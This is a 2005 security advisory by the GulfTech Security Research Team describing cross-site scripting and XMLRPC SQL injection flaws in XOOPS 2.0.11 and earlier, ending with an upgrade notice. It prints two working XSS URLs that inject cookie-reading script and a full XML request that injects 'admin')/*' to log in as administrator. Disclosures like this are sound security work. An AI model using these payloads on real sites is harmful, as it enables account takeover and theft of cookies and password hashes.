@@ -1,0 +1,88 @@
+XOOPS Multiple Vulnerabilities
+
+Vendor: XOOPS
+Product: XOOPS
+Version: <= 2.0.11
+Website: http://www.xoops.org/
+
+BID: 14094 14096 
+CVE: CVE-2005-2112 CVE-2005-2113 
+OSVDB: 17633 17634 17635 
+SECUNIA: 15843 
+PACKETSTORM: 38372 
+
+Description:
+XOOPS is a very popular dynamic web content management system written in Object Oriented PHP. One of the features of XOOPS is it's own XMLRPC server that handles incoming XMLRPC requests. This particular feature is vulnerable to a highly critical SQL Injection issue. Additionally there are several cross site scripting issues in XOOPS as well which could allow for theft of user data or client side code execution in the context of the victim's web browser. 
+
+
+Cross Site Scripting:
+There are a number of cross site scripting issues in the XOOPS content management software. 
+
+http://xoops/modules/newbb/edit.php?forum=1&topic_id=1&viewmode=flat&order= 
+ASC%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C/script%3E&post_id=1 
+
+http://xoops/modules/repository/comment_edit.php?com_itemid=1&com_order=0&com 
+_mode=flat&cid=1&cid=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+%3C/script%3E&com_id=1 
+
+These vulnerabilities can be used to render hostile code in the context of the victims browser, and in turn disclose sensitive information to an attacker. 
+
+
+SQL Injection:
+As I mentioned earlier XOOPS comes with it's own XMLRPC server which is enabled by default and is named xmlrpc.php The problem with XMLRPC in xoops is lack of sanitation, but because the data is recieved from the reserved $HTTP_RAW_POST_DATA variable magic_quotes_gpc are never applied! This is a big problem and makes every allowable RPC method in the XOOPS XMLRPC server vulnerable to SQL injection. Why? Well, the main reason is this. This code is from the bloggerapi.php file that handles all incoming blogger XMLRPC requests. 
+
+function getUserInfo()
+{
+    if (!$this->_checkUser($this->params[1], $this->params[2])) {
+        $this->response->add(new XoopsXmlRpcFault(104));
+    } else {
+        $struct = new XoopsXmlRpcStruct();
+        $struct->add('nickname', new XoopsXmlRpcString($this->user->getVar('uname')));
+        $struct->add('userid', new XoopsXmlRpcString($this->user->getVar('uid')));
+        $struct->add('url', new XoopsXmlRpcString($this->user->getVar('url')));
+        $struct->add('email', new XoopsXmlRpcString($this->user->getVar('email')));
+        $struct->add('lastname', new XoopsXmlRpcString(''));
+        $struct->add('firstname', new XoopsXmlRpcString($this->user->getVar('name')));
+        $this->response->add($struct);
+    }
+}
+
+
+the _checkUser function is really just a wrapper for the XMLRPC server, as the arguments are eventually passed to the XOOPS core function "loginUser()" which is where the real problem happens. Below is a sample xml file that when sent to the server will influence the query. 
+
+<?xml version="1.0"?>
+<methodCall>
+	<methodName>blogger.getPost</methodName>
+		<params>
+			<param>
+			<value><string></string></value>
+			</param>
+			<param>
+			<value><string></string></value>
+			</param>
+			<param>
+			<value><string>admin')/*</string></value>
+			</param>
+			<param>
+			<value><string>passwordfield</string></value>
+			</param>
+			<param>
+			<value><string></string></value>
+			</param>
+		</params>
+</methodCall>
+
+
+This example would authenticate you in as admin and then execute the blogger.getPost method call. An attacker could use this vulnerability to easily gain the administrator hash, and much more. 
+
+
+Solution:
+A new version of XOOPS has been released, and users should upgrade as soon as possible. 
+
+http://www.xoops.org/modules/news/article.php?storyid=2383 
+
+Special thanks to Jan Pederson from XOOPS for acting so quickly on this very high risk issue. Very prompt, very professional! 
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
